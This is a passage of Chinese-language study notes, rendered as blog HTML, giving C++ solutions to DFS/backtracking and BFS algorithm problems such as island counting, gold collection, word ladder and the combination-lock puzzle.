class="line">        for(int i=0;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int j=0;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(grid[i][j]==&#x27;1&#x27; &amp;&amp; !isvisited[i][j])</span><br><span class="line">                &#123;</span><br><span class="line">                    ans++;</span><br><span class="line">                    backtracking(grid,i,j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="岛屿的最大面积"><a href="#岛屿的最大面积" class="headerlink" title="岛屿的最大面积"></a>岛屿的最大面积</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dfs定义的时候就定义成最大面积</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;bool&gt;&gt; isvisited;</span><br><span class="line">//非沉岛法</span><br><span class="line">int maxsize=0;</span><br><span class="line">vector&lt;vector&lt;int&gt;&gt; d&#123;&#123;-1,0&#125;,&#123;0,1&#125;,&#123;1,0&#125;,&#123;0,-1&#125;&#125;;</span><br><span class="line">bool isvalid(vector&lt;vector&lt;int&gt;&gt;&amp;grid,int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">    int m=grid.size();</span><br><span class="line">    int n=grid[0].size();</span><br><span class="line">    return x&gt;=0&amp;&amp;x&lt;m&amp;&amp;y&gt;=0&amp;&amp;y&lt;n;</span><br><span class="line">&#125;</span><br><span class="line">//返回以(x,y)为中心，岛屿的最大面积</span><br><span class="line">int dfs(vector&lt;vector&lt;int&gt;&gt;&amp;grid,int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">    //递归出口:当前不是岛</span><br><span class="line">    if(grid[x][y]==0)</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    //进来修改当前点的遍历属性</span><br><span class="line">    isvisited[x][y]=true;</span><br><span class="line">    int ans=1;</span><br><span class="line">    for(int i=0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int newx=x+d[i][0];</span><br><span class="line">        int newy=y+d[i][1];</span><br><span class="line">        if(isvalid(grid,newx,newy)&amp;&amp;!isvisited[newx][newy])</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=dfs(grid,newx,newy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    maxsize=std::max(maxsize,ans);</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line">int maxAreaOfIsland(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123;</span><br><span class="line">    int m=grid.size();</span><br><span class="line">    if(m==0)</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    int n=grid[0].size();</span><br><span class="line">    isvisited=vector&lt;vector&lt;bool&gt;&gt;(m,vector&lt;bool&gt;(n,false));</span><br><span class="line">    for(int i=0;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int j=0;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(!isvisited[i][j])</span><br><span class="line">            &#123;</span><br><span class="line">                dfs(grid,i,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return maxsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="黄金矿工"><a href="#黄金矿工" class="headerlink" title="黄金矿工"></a>黄金矿工</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">注意回溯里面的写法</span><br><span class="line">沉岛法或者isvisted在修改时，应该在</span><br><span class="line">//做选择</span><br><span class="line">grid[x][y]=0或者isvisited[x][y]=true</span><br><span class="line">//不同选择，做选择的过程</span><br><span class="line">for(int i=0;i&lt;4;i++)</span><br><span class="line">&#123;</span><br><span class="line">//搜索下一层</span><br><span class="line">&#125;</span><br><span class="line">grid[x][y]=1 or isvisited[x][y]=false</span><br><span class="line">//撤销选择</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;int&gt;&gt; d&#123;&#123;-1,0&#125;,&#123;0,1&#125;,&#123;1,0&#125;,&#123;0,-1&#125;&#125;;</span><br><span class="line">int maxvalue=0;</span><br><span class="line">bool isvalid(vector&lt;vector&lt;int&gt;&gt;&amp; grid,int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">    int n=grid.size();</span><br><span class="line">    int m=grid[0].size();</span><br><span class="line">    return x&gt;=0&amp;&amp;x&lt;n&amp;&amp;y&gt;=0&amp;&amp;y&lt;m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int dfs(vector&lt;vector&lt;int&gt;&gt;&amp; grid,int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">    if(grid[x][y]==0)</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    int tmp=grid[x][y];</span><br><span class="line">    grid[x][y]=0;</span><br><span class="line">    int ans=tmp;</span><br><span class="line">    for(int i=0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int newx=x+d[i][0];</span><br><span class="line">        int newy=y+d[i][1];</span><br><span class="line">        if(isvalid(grid,newx,newy))</span><br><span class="line">        &#123;</span><br><span class="line">            ans=max(dfs(grid,newx,newy)+tmp,ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    grid[x][y]=tmp;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int getMaximumGold(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123;</span><br><span class="line">    int m=grid.size();</span><br><span class="line">    if(m==0)</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    int n=grid[0].size();</span><br><span class="line">    for(int i=0;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int j=0;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            maxvalue=max(dfs(grid,i,j),maxvalue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return maxvalue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非沉岛的方法-isvisited数组方法"><a href="#非沉岛的方法-isvisited数组方法" class="headerlink" title="非沉岛的方法(isvisited数组方法)"></a>非沉岛的方法(isvisited数组方法)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">vector&lt;vector&lt;int&gt;&gt; d&#123;&#123;-1,0&#125;,&#123;0,1&#125;,&#123;1,0&#125;,&#123;0,-1&#125;&#125;;</span><br><span class="line">int maxvalue=0;</span><br><span class="line">vector&lt;vector&lt;bool&gt;&gt; isvisited;</span><br><span class="line">bool isvalid(vector&lt;vector&lt;int&gt;&gt;&amp; grid,int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">    int n=grid.size();</span><br><span class="line">    int m=grid[0].size();</span><br><span class="line">    return x&gt;=0&amp;&amp;x&lt;n&amp;&amp;y&gt;=0&amp;&amp;y&lt;m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int dfs(vector&lt;vector&lt;int&gt;&gt;&amp; grid,int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">    if(grid[x][y]==0)</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    int ans=grid[x][y];</span><br><span class="line">    isvisited[x][y]=true;</span><br><span class="line">    for(int i=0;i&lt;4;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int newx=x+d[i][0];</span><br><span class="line">        int newy=y+d[i][1];</span><br><span class="line">        if(isvalid(grid,newx,newy)&amp;&amp;!isvisited[newx][newy])</span><br><span class="line">        &#123;</span><br><span class="line">            ans=max(dfs(grid,newx,newy)+grid[x][y],ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    isvisited[x][y]=false;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int getMaximumGold(vector&lt;vector&lt;int&gt;&gt;&amp; grid) &#123;</span><br><span class="line">    int m=grid.size();</span><br><span class="line">    if(m==0)</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    int n=grid[0].size();</span><br><span class="line">    isvisited=vector&lt;vector&lt;bool&gt;&gt;(m,vector&lt;bool&gt;(n,false));</span><br><span class="line">    for(int i=0;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int j=0;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            maxvalue=max(dfs(grid,i,j),maxvalue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return maxvalue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="分成k个和相等的子集"><a href="#分成k个和相等的子集" class="headerlink" title="分成k个和相等的子集"></a>分成k个和相等的子集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">private:</span><br><span class="line">    vector&lt;bool&gt; vis;</span><br><span class="line">    int n;</span><br><span class="line">public:</span><br><span class="line">    bool canPartitionKSubsets(vector&lt;int&gt;&amp; nums, int k) &#123;</span><br><span class="line">        n = nums.size();</span><br><span class="line">        vis = vector&lt;bool&gt;(n, false);</span><br><span class="line">        int sum = 0;</span><br><span class="line">        for (int x : nums) &#123;</span><br><span class="line">            sum += x;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sum % k) return false;</span><br><span class="line">        int target = sum / k;</span><br><span class="line">        return dfs(nums, 0, 0,target, k);</span><br><span class="line">    &#125;</span><br><span class="line">    //cur:桶内现有的数</span><br><span class="line">    bool dfs(vector&lt;int&gt;&amp; nums,int start, int cur, int target, int k) &#123;</span><br><span class="line">        if (k == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            int count=0;</span><br><span class="line">            for(auto u:vis)</span><br><span class="line">            &#123;</span><br><span class="line">                if(u==true)</span><br><span class="line">                &#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return count==nums.size();</span><br><span class="line">        &#125;</span><br><span class="line">        if (cur == target) &#123;</span><br><span class="line">            return dfs(nums, 0, 0, target, k - 1);</span><br><span class="line">        &#125;</span><br><span class="line">        for (int i = start; i &lt; n; i++) &#123;</span><br><span class="line">            if (vis[i]) continue;</span><br><span class="line">            if (cur + nums[i] &gt; target) continue;</span><br><span class="line">            vis[i] = true;</span><br><span class="line">            cur += nums[i];</span><br><span class="line">            if (dfs(nums, i + 1, cur, target, k)) return true;</span><br><span class="line">            cur -= nums[i];</span><br><span class="line">            vis[i] = false;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-BFS"><a href="#2-BFS" class="headerlink" title="(2)BFS"></a>(2)<strong>BFS</strong></h2><p>bfs把问题抽象成一个图，从一个点开始向四周扩散，解决的是从起点start到终点target的最短路径问题</p><h3 id="单向BFS模板"><a href="#单向BFS模板" class="headerlink" title="单向BFS模板"></a>单向BFS模板</h3><p><img src="https://img-blog.csdnimg.cn/20200129230222575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY2ODg5OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// 计算从起点 start 到终点 target 的最近距离</span><br><span class="line">int BFS(Node start, Node target) &#123;</span><br><span class="line">    Queue&lt;Node&gt; q; // 核心数据结构</span><br><span class="line">    Set&lt;Node&gt; visited; // 避免走回头路</span><br><span class="line"></span><br><span class="line">    q.offer(start); // 将起点加入队列</span><br><span class="line">    visited.add(start);</span><br><span class="line">    int step = 0; // 记录扩散的步数</span><br><span class="line"></span><br><span class="line">    while (q not empty) &#123;</span><br><span class="line">        int sz = q.size();</span><br><span class="line">        /* 将当前队列中的所有节点向四周扩散 */</span><br><span class="line">        for (int i = 0; i &lt; sz; i++) &#123;</span><br><span class="line">            Node cur = q.poll();</span><br><span class="line">            /* 划重点：这里判断是否到达终点 */</span><br><span class="line">            if (cur is target)</span><br><span class="line">                return step;</span><br><span class="line">            /* 将 cur 的相邻节点加入队列 */</span><br><span class="line">            for (Node x : cur.adj())</span><br><span class="line">                if (x not in visited) &#123;</span><br><span class="line">                    q.offer(x);</span><br><span class="line">                    visited.add(x);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        /* 划重点：更新步数在这里 */</span><br><span class="line">        step++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双向BFS：用于直到起点和终点位置</p><h3 id="单词接龙"><a href="#单词接龙" class="headerlink" title="单词接龙"></a>单词接龙</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：beginWord = &quot;hit&quot;, endWord = &quot;cog&quot;, wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]</span><br><span class="line">输出：5</span><br><span class="line">解释：一个最短转换序列是 &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;, 返回它的长度 5。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">bool check(string a,string b)</span><br><span class="line">&#123;</span><br><span class="line">    int i=0;</span><br><span class="line">    int count=0;</span><br><span class="line">    while(i&lt;a.size())</span><br><span class="line">    &#123;</span><br><span class="line">        if(a[i]!=b[i])</span><br><span class="line">        &#123;</span><br><span class="line">            count++;</span><br><span class="line">            if(count&gt;1)</span><br><span class="line">                return false;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return count==1;</span><br><span class="line">&#125;</span><br><span class="line">    int ladderLength(string beginWord, string endWord, vector&lt;string&gt;&amp; wordList) &#123;</span><br><span class="line">        unordered_set&lt;string&gt; wordSet(wordList.begin(),wordList.end());</span><br><span class="line">        if(wordSet.find(endWord)==wordSet.end())</span><br><span class="line">        &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        queue&lt;string&gt; que1;</span><br><span class="line">        queue&lt;string&gt; que2;</span><br><span class="line">        unordered_map&lt;string,int&gt; map1;</span><br><span class="line">        unordered_map&lt;string,int&gt; map2;</span><br><span class="line">        que1.push(beginWord);</span><br><span class="line">        que2.push(endWord);</span><br><span class="line">        map1.insert(&#123;beginWord,0&#125;);</span><br><span class="line">        map2.insert(&#123;endWord,0&#125;);</span><br><span class="line">        while(!que1.empty()&amp;&amp;!que2.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            if(que1.size()&gt;que2.size())</span><br><span class="line">            &#123;</span><br><span class="line">                que1.swap(que2);</span><br><span class="line">                map1.swap(map2);</span><br><span class="line">            &#125;</span><br><span class="line">            int size=que1.size();</span><br><span class="line">            while(size--)</span><br><span class="line">            &#123;</span><br><span class="line">                auto word=que1.front();</span><br><span class="line">                que1.pop();</span><br><span class="line">                int path=map1[word];</span><br><span class="line">                if(map2.count(word))</span><br><span class="line">                &#123;</span><br><span class="line">                    return path+map2[word]+1;</span><br><span class="line">                &#125;</span><br><span class="line">                for(int i=0;i&lt;word.size();i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    for(int j=0;j&lt;26;j++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        char c=&#x27;a&#x27;+j;</span><br><span class="line">                        string newword=word;</span><br><span class="line">                        newword[i]=c;</span><br><span class="line">                        if(map1.count(newword)==0&amp;&amp;wordSet.find(newword)!=wordSet.end())</span><br><span class="line">                        &#123;</span><br><span class="line">                            map1[newword]=path+1;</span><br><span class="line">                            que1.push(newword);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="密码锁"><a href="#密码锁" class="headerlink" title="密码锁"></a>密码锁</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：deadends = [&quot;0201&quot;,&quot;0101&quot;,&quot;0102&quot;,&quot;1212&quot;,&quot;2002&quot;], target = &quot;0202&quot;</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">可能的移动序列为 &quot;0000&quot; -&gt; &quot;1000&quot; -&gt; &quot;1100&quot; -&gt; &quot;1200&quot; -&gt; &quot;1201&quot; -&gt; &quot;1202&quot; -&gt; &quot;0202&quot;。</span><br><span class="line">注意 &quot;0000&quot; -&gt; &quot;0001&quot; -&gt; &quot;0002&quot; -&gt; &quot;0102&quot; -&gt; &quot;0202&quot; 这样的序列是不能解锁的，</span><br><span class="line">因为当拨动到 &quot;0102&quot; 时这个锁就会被锁定。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">string plus(string s,int i)</span><br><span class="line">&#123;</span><br><span class="line">    if(s[i]==&#x27;9&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i]=&#x27;0&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        s[i]=s[i]+1;</span><br><span class="line">    &#125;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line">string minus(string s,int i)</span><br><span class="line">&#123;</span><br><span class="line">    if(s[i]==&#x27;0&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i]=&#x27;9&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        s[i]=s[i]-1;</span><br><span class="line">    &#125;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int openLock(vector&lt;string&gt;&amp; deadends, string target) &#123;</span><br><span class="line">    queue&lt;string&gt; que1;</span><br><span class="line">    queue&lt;string&gt; que2;</span><br><span class="line">    int step=0;</span><br><span class="line">    unordered_set&lt;string&gt; set1;</span><br><span class="line">    unordered_set&lt;string&gt; set2;</span><br><span class="line">    unordered_set&lt;string&gt; deadset(deadends.begin(),deadends.end());</span><br><span class="line">    que1.push(&quot;0000&quot;);</span><br><span class="line">    que2.push(target);</span><br><span class="line">    set1.insert(&quot;0000&quot;);</span><br><span class="line">    set2.insert(target);</span><br><span class="line">    while(!que1.empty()&amp;&amp;!que2.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        if(que1.size()&gt;que2.size())</span><br><span class="line">        &#123;</span><br><span class="line">            que1.swap(que2);</span><br><span class="line">            set1.swap(set2);</span><br><span class="line">        &#125;</span><br><span class="line">        int size=que1.size();</span><br><span class="line">        while(size--)</span><br><span class="line">        &#123;</span><br><span class="line">            string tmp=que1.front();</span><br><span class="line">            que1.pop();</span><br><span class="line">            if(deadset.find(tmp)!=deadset.end())</span><br><span class="line">            &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            if(set2.find(tmp)!=set2.end())</span><br><span class="line">            &#123;</span><br><span class="line">                return step;</span><br><span class="line">            &#125;</span><br><span class="line">            for(int i=0;i&lt;4;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                string newword=plus(tmp,i);</span><br><span class="line">                if(set1.find(newword)==set1.end())</span><br><span class="line">                &#123;</span><br><span class="line">                    que1.push(newword);</span><br><span class="line">                    set1.insert(newword);</span><br><span class="line">                &#125;</span><br><span class="line">                string newword1=minus(tmp,i);</span><br><span class="line">                if(set1.find(newword1)==set1.end())</span><br><span class="line">                &#123;</span><br><span class="line">                    que1.push(newword1);</span><br><span class="line">                    set1.insert(newword1);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        step++;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="省份数量-朋友圈"><a href="#省份数量-朋友圈" class="headerlink" title="省份数量+朋友圈"></a>省份数量+朋友圈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 